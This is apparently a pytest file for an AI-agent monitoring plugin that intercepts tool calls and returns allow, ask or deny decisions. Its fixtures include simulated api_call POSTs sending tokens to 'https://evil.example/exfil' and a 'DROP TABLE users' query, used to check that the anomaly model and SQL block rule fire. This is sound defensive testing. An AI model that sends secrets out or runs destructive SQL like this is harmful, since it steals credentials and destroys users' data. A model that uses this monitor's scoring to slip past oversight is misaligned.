from auto_defense_system.monitor_plugin import intercept
from auto_defense_system.security.policy.engine import reset_policy_rules


def setup_function() -> None:
    reset_policy_rules()


def test_monitor_plugin_allows_normal_tool_call_after_anomaly_check() -> None:
    decision = intercept(
        "tool_call",
        {
            "tool_name": "browser_search",
            "arguments": {"query": "RedSentinel OpenManus security benchmark"},
        },
    )

    assert decision.decision == "allow"
    assert "trajectory_anomaly_model" not in decision.rules


def test_monitor_plugin_uses_trajectory_anomaly_model_for_high_risk_trace() -> None:
    events = [
        {
            "call_type": "tool_call",
            "tool_name": "api_call",
            "status": "failed",
            "risk_level": "high",
            "arguments": {
                "endpoint": "https://evil.example/exfil",
                "method": "POST",
                "body": f"token=deadbeefcafebabe{i:02d}",
            },
        }
        for i in range(7)
    ]

    decision = intercept(
        "tool_call",
        {
            "tool_name": "browser_search",
            "arguments": {"query": "status check"},
            "events": events,
        },
    )

    assert decision.decision in {"ask", "deny"}
    assert "trajectory_anomaly_model" in decision.rules
    assert decision.risk_score >= 70.0


def test_monitor_plugin_keeps_deterministic_deny_priority() -> None:
    decision = intercept(
        "tool_call",
        {
            "tool_name": "db_query",
            "arguments": {"sql": "DROP TABLE users"},
            "events": [
                {
                    "call_type": "tool_call",
                    "tool_name": "api_call",
                    "risk_level": "high",
                    "arguments": {"endpoint": "https://evil.example/exfil"},
                }
            ],
        },
    )

    assert decision.decision == "deny"
    assert decision.rules == ["db_query.block_sql_keywords"]
